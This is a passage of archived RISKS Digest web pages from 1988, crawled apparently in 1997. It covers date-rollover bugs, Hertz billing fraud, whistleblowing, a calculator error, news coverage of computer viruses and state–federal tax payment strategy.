FOR TAX REQUIRED TO BE PAID to Canada for kinds 1. and 4.  Canada only wanted
to tax kinds 1. and 2., and granted a credit FOR TAX REQUIRED TO BE PAID to
the US on kind 1.  The fixed point was reached in only two iterations because
of MIN and MAX occurring at strategic points in the calculation.

However, to complicate the situation, this was the year that treatment of
foreign earned income was "reformed," and Congress changed the law
RETROACTIVELY several times.  I filed a form 1040R to claim an increased
refund, and received two other small unsolicited US refunds.  I suppose I
should have recalculated my Canadian tax, too, but I didn't.

    [I note that the convergence in this case in the CA/fed case may not always
    result in a unique solution -- a pair of oscillating solutions could arise,
    because of round-off...  By the way, several readers noted (again -- see
    my comments in <A HREF="/Risks/6.17.html">RISKS-6.17</A>) that there is no actual iteration if you are
    happy with whatever state tax you estimated and paid in 1987.  So I keep
    responding that the iteration results from trying to refine the estimate,
    but that is not required by law.  PGN]

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Horrendous proliferation of BITNET barfmail
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Fri 29 Jan 88 17:00
From: Neumann@SRI.COM

  =======================================================================
  === HELP!   risks@hemuli.uucp vanished, CAUSING ALL BITNET READERS  ===
  === to get many (60 is the most reported yet) copies of BARFMAIL!   ===
  === dae@PSUVAX1 reported that this address has been invalid for     ===
  === quite a while and it cannot deliver the message since PSUVAX1   ===
  === doesn't know the path to that .UUCP node.  If anyone does know  ===
  === a node, please tell dae (mon). (Noted by Marc Shannon, to whom  ===
  === you BITNETters generally owe thanks for having volunteered to   ===
  === help you all stay in contact with RISKS, despite all the flaki- ===
  === ness of the interconnections.  I can't fix it.  Sorry.)  PGN    ===
  =======================================================================

              *FOR PROSPECTIVE BITNET SUBSCRIBERS*

By the way, many of you have recently requested to be added.  In some cases
I find I cannot get mail back to you! So, here once again is the procedure.
(PLEASE DON'T SEND BITNET REQUEST MAIL TO ME.)


Please try to add yourself according to the following recipe.  (Any one of
the three locations should work -- they are supposed to be interconnected.)
That way you will be able to handle future changes directly.  

&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;

                        BITNET SUBSCRIBERS: 
             DO NOT NOTIFY RISKS OF FUTURE ADDRESS CHANGES.  
For subscription assistance, please observe the following instructions:
  
  For WISCVM, send mail to LISTSERV@CMUCCVMA, with a single line request:
SUBSCRIBE MD4H your name         or        UNSUBSCRIBE MD4H your name

  For FINHUTC, send mail to LISTSERV@FINHUTC, with a single line request:
SUBSCRIBE RISKS your name        or        UNSUBSCRIBE RISKS your name

  For UGA, send mail to LISTSERV@UGA, with a single line request:
SUBSCRIBE RISKS your name        or        UNSUBSCRIBE RISKS your name

The only mail to RISKS@CSL.SRI.COM should be RISKS contributions.

&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.17.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.19.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-55</DOCNO>
<DOCOLDNO>IA012-000130-B024-80</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.19.html 128.240.150.127 19970217015423 text/html 26084
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:52:47 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 19</TITLE>
<LINK REL="Prev" HREF="/Risks/6.18.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.20.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.18.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.20.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 19</H1>
<H2> Monday, 1 February 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
No Time like the Present for Old Timers 
</A>
<DD>
<A HREF="#subj1.1">
Scott Dorsey
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  More software future shock 
</A>
<DD>
<A HREF="#subj2.1">
William Smith
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  TV Remote controls 
</A>
<DD>
<A HREF="#subj3.1">
Richard Dervan
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Hertz Computer Hertz Repairees 
</A>
<DD>
<A HREF="#subj4.1">
Dave Wortman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Blowing Whistles or Blowing Smoke? 
</A>
<DD>
<A HREF="#subj5.1">
Guthery
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Your SideKick may not be on your Side! 
</A>
<DD>
<A HREF="#subj6.1">
Scott M. Martucci
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: Library Privacy -- the backup system 
</A>
<DD>
<A HREF="#subj7.1">
David Collier-Brown
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Virus anxiety expressed in NY TIMES 
</A>
<DD>
<A HREF="#subj8.1">
Jon Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Re: A feedback loop in tax preparation algorithms 
</A>
<DD>
<A HREF="#subj9.1">
Les Earnest
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
No Time like the Present for Old Timers (Re: <A HREF="/Risks/6.16.html">RISKS-6.16</A>)
</A>
</H3>
<address>
Scott Dorsey
&lt;<A HREF="mailto:kludge@pyr.gatech.edu ">
kludge@pyr.gatech.edu 
</A>&gt;
</address>
<i>
Fri, 29 Jan 88 22:59:50 EST
</i><PRE>

In Risks 6.16, John McLeod from Right Here at Tech writes:
&gt;I was told by a professor recently that Nobody should have any money in a 
&gt;bank between december 31 1999 and jan 1 2001.  As there are so many 
&gt;cobol programs in existence with a two character year field.

    I worked at one point for a mental hospital which had a lot of long-term
patients.  The patient's year of birth was represented as a 2-digit number,
and any patients with negative ages (who had been born before 1900) had 100 
added to their age whever ages were calculated.  This worked quite well for
several years, until one of the patients in the geriatric unit passed age
100.  Now anyone who is less than 10 years old is assumed to be a rollover,
as there were no patients under 14 years of age at the time the patch was made.

Scott Dorsey   Kaptain_Kludge
SnailMail: ICS Programming Lab, Georgia Tech, Box 36681, Atlanta, Georgia 30332
uucp:	...!{decvax,hplabs,ihnp4,linus,rutgers,seismo}!gatech!gitpyr!kludge

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
More software future shock
</A>
</H3>
<address>
William Smith
&lt;<A HREF="mailto:wsmith@b.cs.uiuc.edu ">
wsmith@b.cs.uiuc.edu 
</A>&gt;
</address>
<i>
Sat, 30 Jan 88 00:24:27 CST
</i><PRE>

If you aren't tired of problems with regards to time functions, here is
another:

In the version of Ultrix from 2 years ago, ctime() returned garbage 
characters in the year field if the date was past the year 1999.  I haven't 
used that system for 2 years, so the bug may have been fixed by now, but I 
wouldn't bet on that.

Bill Smith, wsmith@a.cs.uiuc.edu, pur-ee!uiucdcs!wsmith

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
TV Remote controls
</A>
</H3>
<address>
Richard Dervan
&lt;<A HREF="mailto:ccoprrd@pyr.gatech.edu ">
ccoprrd@pyr.gatech.edu 
</A>&gt;
</address>
<i>
Sun, 31 Jan 88 12:44:45 EST
</i><PRE>

&gt; ... great possibilities for unscrupulous TV station programmers... 

Well, this is possible, but how are you going to know which frequency or
harmonic to include in your commercials?  What might change one TV to the
channel the commercial is being broadcast on, might change another TV to a
different channel.  I have never known of a standard for sonic remote
controls.
                                  -Richard Dervan

Richard B Dervan - Office of Computing Services          | Go you fuzzy |
Georgia Insitute of Technology, Atlanta Georgia, 30332   |     Bees     |
uucp: ...!{akgua,allegra,amd,hplabs,ihnp4,seismo}!gatech!gitpyr!ccoprrd
ARPA: ccoprrd@pyr.gatech.edu       BitNet: ccoprrd@gitnve2.gatech.edu

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Hertz Computer Hertz Repairees
</A>
</H3>
<address>
Dave Wortman 
&lt;<A HREF="mailto:dw%csri.toronto.edu@RELAY.CS.NET">
dw%csri.toronto.edu@RELAY.CS.NET
</A>&gt;
</address>
<i>
Sun, 31 Jan 88 18:26:16 EST
</i><PRE>

Last week the NY Times Service reported that Hertz Corp is cooperating with
the Justice Dept in an investigation of allegations that Hertz fraudulently
overcharged customers who damaged rental cars and were liable for repair
charges.  Hertz apparently bought repair parts and services at discount
rates but billed customers and insurance companies at a higher rate.  Hertz
has already issued refunds of about $3M and it is estimated that they may
have collected $13M through these questionable practices.

Hertz's computers were in on the fraud.  In some parts of the U.S., company
computers generated two estimates, one for the actual repairs and one with
higher prices which was sent to customers and insurers.

Dave Wortman, Computer Systems Research Institute, University of Toronto

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Blowing Whistles or Blowing Smoke?
</A>
</H3>
<address>
"guthery%asc@sdr.slb.com" 
&lt;<A HREF="mailto:GUTHERY%asc.sdr.slb.com@RELAY.CS.NET">
GUTHERY%asc.sdr.slb.com@RELAY.CS.NET
</A>&gt;
</address>
<i>
Mon, 1 Feb 88 06:36 EDT
</i><PRE>

I agree with Nancy Leveson and have argued previously that the quality of
our systems won't improve until we are willing to accept personal and
financial responsibility for that quality.  However, I seriously question
the contribution of whistle blowing to this process.

First, it seems to me that the very last thing a whistle blower is
interested in is accepting responsibility.  What a whistle blower is saying
to me is "Something is wrong here and rather than fix it and risk being held
even partially responsible, I'll make sure I'm perceived as being wholly
blameless by being a really Good Person and blowing this whistle and
pointing my finger at everybody else in sight".  In other words, encouraging
whistle blowing provides a DISINCENTIVE to the acceptance of personal
responsibility and accountability.  Do you want to risk your family's
financial security to a guy who's going to start lobbing fault grenades at
the first sign of difficulty or something unexpected?

Secondly, while I certainly haven't compiled a definitive body of cases, it
always seems that most whistle blowing has to do with how the papers where
shuffled and the most predictable aftereffect of whistle blowing is still
more bureaucracy.  Now anyone who thinks that bureaucracies are good at
engendering a sense of personal responsbility hasn't dropped by City Hall
and tried to explain that the car was in the garage when the ticket was
issued.  And anyone who thinks that bureaucracies build safe, reliable
compuer systems should visit the Social Security Administration's data
processing center or their favorite nuclear reactor project.

I don't think we know enough about building computer systems to build good
systems without making mistakes.  Indeed, it is exactly the process of
making mistakes that will teach us how to build good ones and avoid building
bad ones.  Whistle blowers would deny us this learning and condem us to
building with our current and quite incomplete state of knowledge.  In the
main, they are 20th century Luddites blowing smoke not whistles.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
 Your SideKick may not be on your Side!
</A>
</H3>
<address>
"Scott M. Martucci" 
&lt;<A HREF="mailto:Martucci@DOCKMASTER.ARPA">
Martucci@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Mon, 1 Feb 88 14:29 EST
</i><PRE>

While using the calculator option on SideKick, an error was discovered in a
particular calculation.  The simple division of 25963 by 25454 resulted in
1.014 (The actual answer is approximately 1.02).  After calculating
variations on the two numbers (i.e., dividing each by 10) and performing the
division, the correct answer was displayed for that division.  Other numbers
in the range of the original numbers were used with no problems.  I don't
believe this problem is isolated to a particular version, as two different
versions were tested with the same results.
                                                        Scott

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: Library Privacy -- the backup system (Michael Wagner, <A HREF="/Risks/6.10.html">RISKS-6.10</A>)
</A>
</H3>
<address>
David Collier-Brown
&lt;<A HREF="mailto:geac!daveb@uunet.UU.NET ">
geac!daveb@uunet.UU.NET 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 29 Jan 88 13:12:35 GMT

    To my (slight) surprise, the Geac library systems used worldwide
provides considerable protection against undesirable recreation of
data from backup tapes.

    As it happens, the material on the tapes are images of bit-aligned,
n-bit-character, variable-length-pointer information. 

   To read them one needs either:
	1) a very good understanding of the system storage
	   compression mechanisms, or
	2) an unused library to use to restore each backup, run your
	   searches and then go on to the next backup.

    The net result is that trying to get around the normal security
protection against linking from patron to returned books may take an
arbitrarily long time and arbitrary amounts of a scarce resource.

    It is trivially true that any backup system can "be (mis)used to
recreate the data in other situations", even if one is running a B2
Multics machine.  One can, however, make it impractical.

dave (as much by good luck as by good management) collier-brown
 
 David Collier-Brown.                 {mnetor yunexus utgpu}!geac!daveb
 Geac Computers International Inc.,   |  Computer Science loses its
 350 Steelcase Road,Markham, Ontario, |  memory (if not its mind) 
 CANADA, L3R 1B3 (416) 475-0525 x3279 |  every 6 months.

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Virus anxiety expressed in NY TIMES
</A>
</H3>
<address>
Jon Jacky
&lt;<A HREF="mailto:jon@june.cs.washington.edu ">
jon@june.cs.washington.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: Sun, 31 Jan 88 18:56:10 PST

There is a big story on the front page of the business section (section 3)
of the Sunday, Jan 31, 1987 NEW YORK TIMES: "Computer systems under seige,"
by Vin McLellan.  Most of the incidents reported there will be familiar to
RISKS readers, but what is notable is the prominence given the article, and
the interest and worry apparently abroad.  In particular, there is a lot of
concern about the political and military implications.  The story comes with
a big illustration of a centipede-like critter seated typing at a PC,
surrounded by a sea of PC's, each screen displaying an illustration of that
same creature.  Some excerpts (my comments in parentheses):

"The dangers of viruses and some of these other computer attacks are just 
unbelievable," says Donald Latham, executive vice president of the Computer
Sciences Corporation and former Assistant Secretary of Defense who ran
a Reagan Administration program to increase security in civilian and
government computer systems.  "The threat is more serious than most people
think; no one can say enough about it."

(Latham was chief of C3I at the Pentagon, and was always testifying to 
Congress about command and control of nuclear forces, launch-on-warning,
and things like that.)

(There is the interesting news that the Israeli virus might have been 
politically motivated: )

"One of the most troubling reports has come from Israel, where an infectious
virus code was spread widely over a two-month period last fall and was
apparently intended as a weapon of political protest.  The code contained a
"time bomb" that on Friday, May 13, 1988, would have caused infected programs
to erase all stored files, according to Yuval Rakavy, a student at Hebrew 
University who first discovered, then dismantled the virus code.  
May 13 will be the 40th anniversary of the last day Palestine existed as a 
political entity; Israel declared its independence on May 14, 1948. ...
Israeli officials suggested a "Friday the 13th" coincidence, but Mr. Rakavy
said the virus was coded to ignore Nov. 13, 1987."

"Concern about the viruses has spread well beyond the computer industry.
Officials at several affected colleges said they had been contacted by a
representative of the National Security Agency, the Pentagon agency
responsible for the security of classified Government computer systems and 
electronic spying abroad, and asked for details about viral codes.  Since
1985, the NSA and various military groups have sponsored several unpublicized
and often-classifies conferences about risks of virus attacks at Government
computer installations." 

"Digital Dispatch Inc. of Minneapolis ... developed Data Physician, which 
identifies and removes viruses on IBM PC and Unix systems.  Since 1985 it has
sold 500 copies, over half to American military buyers. ... 
'We would have dropped it long ago if we didn't get
a couple calls from US military sites every month, urging us to keep it 
available," (a company spokesperson) said.'" 

- Jon Jacky, University of Washington

    [Vin McLellan actually sent me the whole text on line BEFORE it appeared
    (THANKS!), and several others sent me the text as it appeared.  There is
    enough repetition with previous issues that I decided to go with Jon's
    abridgement.  But, for those of you who missed it, the entire text
    is also available for FTPers as <A HREF="/Risks/6.19.html">RISKS-6.19</A>V.  PGN]

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
re: A feedback loop in tax preparation algorithms 
</A>
</H3>
<address>
Les Earnest 
&lt;<A HREF="mailto:LES@SAIL.Stanford.EDU">
LES@SAIL.Stanford.EDU
</A>&gt;
</address>
<i>
01 Feb 88  0450 PST
</i><PRE>

[In response to RISKS Wednesday, 27 January 1988 Volume 6 : Issue 16]

Lawrence Bernstein of the S.F. Chronicle, author of the tax article you
cite, seems to have confused himself -- the alleged recursion in the tax
forms does not exist.  While there _is_ a coupling between state and federal
tax payments for those who itemize their federal deductions, the task of
determining the optimum payment strategy involves no recursive calculations.

In fact, there has been no structural change in the relationship between
California and federal tax calculations this year or any recent year, other
than knocking out some deductions and fiddling some tax rates.  There is no
basis for claiming that the basic structure of this calculation has changed.

Given that state income tax payments made during the tax year can be
deducted from federal income, there _is_ a degree of freedom that you can
fiddle within limits, namely the amount of state tax that you choose to pay
during the year.  If you choose to leave that quantity "free," then your tax
calculations are not recursive, they are undefined! In order to resolve how
much to pay, you must choose a financial objective.

Suppose that your goal is to exactly pay both the state and federal taxes
that you will owe by the end of the tax year.  In this case you should use
the following procedure:

1. Shortly before the end of the tax year, estimate the state taxes that
you will owe and adjust your state withholding payments to meet this goal.

2. Taking into account the state tax payments determined in step 1,
compute the federal tax that you will owe and adjust your federal
withholding rate to meet this goal.

While the income tax forms of California and some other states use numbers
from the federal tax form, such as adjusted gross income, in no case does
the amount of the state tax depend on the amount of federal tax owed or
paid in the current year.  In other words, there is no recursion in this
calculation.

While some people feel good about paying their taxes as exactly as
possible by the end of the year, most people prefer a strategy that
maximizes net income.  Taking into account the value of money (i.e. the
value of hanging onto it as long as possible and investing it so as to
realize additional income), the following tax payment strategy is optimum
for those who do NOT itemize deductions on their federal tax.

1.  At the beginning of the tax year, set both your state and federal
withholding rates as low as legally permissible.

2.  Near the end of the year, estimate what you will owe in state and
federal taxes and arrange to underpay these amounts by the maximum amounts
that do not incur penalties.  If adjusting the withholding rates is
insufficient for this purpose, you may arrange to give your employer
a supplementary payment, to be deposited with your withholding payments.

3.  After the end of the tax year, calculate the taxes you owe and
pay them as late as permissible (usually April 15).

The optimum strategy for those who itemize deductions on their federal
taxes is the same as above as far as federal tax payments are concerned,
but the right strategy for state tax payments at the end of the year may
be different because of the deductibility of these taxes.

To my surprise (and contrary to professional advice that I have received),
the optimum strategy for most people who itemize their federal deductions is
to either substantially overpay their state tax just before the end of the
year or to substantially underpay it.  In the case where overpayment wins,
it is because the interest that they must pay (or give up) on the
overpayment during the two months or so that it takes to get a refund from
the state is more than offset by the fact that they effectively postpone
part of their federal tax obligation into the following year and can thereby
earn interest on that saving for about a year.  In cases where this
situation reverses, underpayment is the best strategy.  Interestingly
enought, paying exactly the right state tax by the end of the year is almost
never optimal!   

The balance of this note gives a slightly deeper explanation of how
itemizers may optimize their state tax payments.

  [It is less relevant to RISKS, but interesting enough in its own right. PGN]

Because of the deductability of state income tax, the federal taxes owed
by a given individual in a given year can be expressed as a piecewise
linear function of the amount of state taxes paid during the year.  For
example, if X is the amount of overpayment of state taxes during the tax
year (negative if you underpay), then for moderate values of X (i.e.
values that do not change your federal tax bracket) the amount of federal
taxes that you will owe is exactly
     T = F - r*X						(1)
where F is the amount of federal taxes you would pay if your state tax
payments exactly matched what you owed the state for the year and r
is the income tax rate for your federal tax bracket.

Using (1), it can be shown that the formula for net income (i.e. income
less state and federal taxes, taking into account the cost in interest
paid or made) can be expressed in the form
    I = A + B*X  if X &gt; 0					(2a)
or
    I = A + C*X  if X &lt;= 0					(2b)
where A, B, and C are essentially constants for a given individual in a
given year.  Here, A depends on income and available deductions, while B
and C depend on the individual's federal tax rate in the current year and
the next one, interest rates for lending or borrowing money, and the
timing of state and federal tax filings.  The main reason why there are
two formulas (i.e. the reason the value of C is different from B) is that
the timing of refunds is different from final tax payments and borrowing
and lending interest rates may be different.  Calculating personal values
of A, B, and C is left as an exercise for the reader.

It an be seen from (2) that if both B and C are positive, you will
increase your net income by increasing your state tax overpayment, X.
Inasmuch as large overpayments of state tax may lower your federal tax
bracket, how far you can go advantageously may involve calculations
in more than one tax bracket.

If both B and C are negative, you will increase your net income by
underpaying your state tax as much as possible.  In this case, how far you
should go depends on the state schedule of penalties for underpayments.

If B is positive and C is negative, the best strategy may be to either
overpay or underpay -- you have to evaluate both.  In the opposite case
(B negative and C positive), the optimum strategy will be to pay your
estimated state taxes exactly (no over- or under-payment).

To facilitate making sample calculations, let us make some simplifying
assumptions:
(a) lending and borrowing interest rates are the same (e.g. you have a
    savings account with fixed interest rate that you can push money into
    and out of),
(b) your marginal tax rates will be same next year as this year,
(c) you always underpay federal taxes and settle up as late as possible
    (i.e. you follow the optimum strategy).
Then using a simple interest rate model, it can be shown that
    B = i*(r*Y - R)						(3a)
    C = i*(r*Y - P)						(3b)
where i is the interest rate that you pay or get,
      r is your federal tax rate,
      Y is the length of time you get to keep postponed federal tax payments,
           namely one year,
      R is the length of time you must wait for a state tax refund, typically
           about 1/6 year (2 months).
      P is the length of time you can wait to make final payment of state
	   taxes, namely 3.5/12 = .29166 year.

Suppose that your federal tax rate r is 15%; then using Y = 1, R = 1/6, and
P = .29166, we get B = -.0166*i and C = - .14166*i.  It follows that the
best strategy is to underpay the state tax, no matter what interest rate i
you use.

If your federal tax rate is 35%, then the situation reverses and it becomes
advantageous to overpay.  In fact the higher your tax bracket, the more
advantageous overpayment becomes.  This strategy is also more likely to
be favorable if next year's federal tax bracket will be lower than your
current one, as is true for many people at present.

Note that since P &gt; R in the situation examined here, it follows that if
B is negative then C is even more negative.  From the analysis above, it
follows that it never pays to pay your state taxes exactly by the end of
the year -- you should always either over- or under-pay them!

Les Earnest

Disclaimer: I am not a tax consultant, so don't take my advice without
verifying it with someone having credentials.  Unfortunately, you may
have to shop a bit before you find someone who understands the issues.

    [I hope this shoots the straw herring in midstream.  Thanks.  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.18.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.20.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-56</DOCNO>
<DOCOLDNO>IA012-000130-B024-103</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.20.html 128.240.150.127 19970217015442 text/html 27472
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:53:04 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 20</TITLE>
<LINK REL="Prev" HREF="/Risks/6.19.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.21.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.19.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.21.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 20</H1>
<H2> Tuesday, 2 February 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Unusual Computer Risk -- Harem Scarem? 
</A>
<DD>
<A HREF="#subj1.1">
Mike Bell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Mistaken AIDS warnings 
</A>
<DD>
<A HREF="#subj2.1">
Al Stangenberger
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Human error vs human error (and bad design) 
</A>
<DD>
<A HREF="#subj3.1">
George Michaelson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Technology Transfer Policy 
</A>
<DD>
<A HREF="#subj4.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Blowing Whistles or Blowing Smoke?  
</A>
<DD>
<A HREF="#subj5.1">
Ronni Rosenberg
</A><br>
<A HREF="#subj5.2">
 Dan Franklin
</A><br>
<A HREF="#subj5.3">
     Jonathan Kamens
</A><br>
<A HREF="#subj5.4">
 Phil Agre
</A><br>
<A HREF="#subj5.5">
 Steve Philipson
</A><br>
<A HREF="#subj5.6">
 Frank Houston
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Virus anxiety expressed in NY TIMES 
</A>
<DD>
<A HREF="#subj6.1">
Amos Shapir
</A><br>
</DL>

